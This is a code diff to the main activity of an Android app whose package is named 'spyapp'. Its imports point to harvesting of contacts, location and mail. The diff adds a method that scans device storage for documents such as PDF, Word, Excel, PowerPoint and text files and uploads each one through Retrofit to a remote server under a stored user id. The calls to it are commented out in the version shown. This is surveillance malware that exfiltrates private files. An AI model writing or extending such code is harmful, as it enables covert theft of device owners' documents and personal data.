@@ -52,11 +52,15 @@ import java.util.List;
 import java.util.Locale;
 
 import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
+import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
 import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
 import kkactive_india.in.spyapp.mailPOJO.mailBean;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.RequestBody;
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -83,6 +87,9 @@ public class MainActivity extends AppCompatActivity {
     SharedPreferences.Editor edit;
     final String state = Environment.getExternalStorageState();
     List<String> list;
+    ConnectionDetector cd;
+    File file;
+
 
 
     @TargetApi(Build.VERSION_CODES.O)
@@ -100,6 +107,8 @@ public class MainActivity extends AppCompatActivity {
         bar = (ProgressBar) findViewById(R.id.progress);
         pref = getSharedPreferences("pref", Activity.MODE_PRIVATE);
         edit = pref.edit();
+
+        cd = new ConnectionDetector(getApplication());
 
         login.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -274,7 +283,8 @@ public class MainActivity extends AppCompatActivity {
         // getSMS();
 
 
-        files();
+        //files();
+      //  filesss();
 
 
        /* ArrayList<String> galleryImageUrls;
@@ -327,11 +337,13 @@ public class MainActivity extends AppCompatActivity {
         list = new ArrayList<String>();
 
 
-        for (int i = 0; i < allPdfFiles.getCount(); i++) {
-            allPdfFiles.moveToPosition(i);
-            int dataColumnIndex = allPdfFiles.getColumnIndex(MediaStore.Files.FileColumns.DATA);//get column index
-            list.add(allPdfFiles.getString(dataColumnIndex));//get Image from column index
+        for (int i = 0; i < allNonMediaFiles.getCount(); i++) {
+            allNonMediaFiles.moveToPosition(i);
+            int dataColumnIndex = allNonMediaFiles.getColumnIndex(MediaStore.Files.FileColumns.DATA);//get column index
+            list.add(allNonMediaFiles.getString(dataColumnIndex));//get Image from column index
         }
+
+        file = new File(String.valueOf(list));
 
         Log.e("PdfBhai", String.valueOf(list));
         // Log.e("PdfBhai", String.valueOf(allPdfFiles));
@@ -339,6 +351,77 @@ public class MainActivity extends AppCompatActivity {
 
 
     }
+
+
+    public void filesss(){
+
+        if (cd.isConnectingToInternet()){
+
+
+            MultipartBody.Part body1 = null;
+
+            for (int i = 0; i < list.size(); i++) {
+
+                file = new File(list.get(i));
+
+                if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
+                        || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
+                        || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
+                        || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
+                {
+                    // Log.e(" FILES",file.getName());
+                    //Log.e(" FILES",file.getAbsolutePath());
+
+                    RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
+                    body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);
+
+                    Bean b = (Bean) getApplicationContext();
+
+                    Retrofit retrofit = new Retrofit.Builder()
+                            .baseUrl(b.baseURL)
+                            .addConverterFactory(ScalarsConverterFactory.create())
+                            .addConverterFactory(GsonConverterFactory.create())
+                            .build();
+                    Allapi cr = retrofit.create(Allapi.class);
+                    String id = pref.getString("id", "");
+                    Call<fileBean> call = cr.files(id, body1);
+                    call.enqueue(new Callback<fileBean>() {
+                        @Override
+                        public void onResponse(Call<fileBean> call, Response<fileBean> response) {
+
+                            Log.d("Files", "yess Gaye");
+
+                        }
+
+                        @Override
+                        public void onFailure(Call<fileBean> call, Throwable t) {
+
+                        }
+                    });
+
+                }
+
+
+
+            }
+
+            Log.d("ListSize",String.valueOf( list.size()));
+
+            long imagename = System.currentTimeMillis();
+
+            String strName = imagename + file.getName();
+
+            Log.d("asdasdasd" , strName);
+
+            // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+
+
+
+        }
+
+    }
+
+
 
     private void getAllFilesOfDir(File directory) {
 
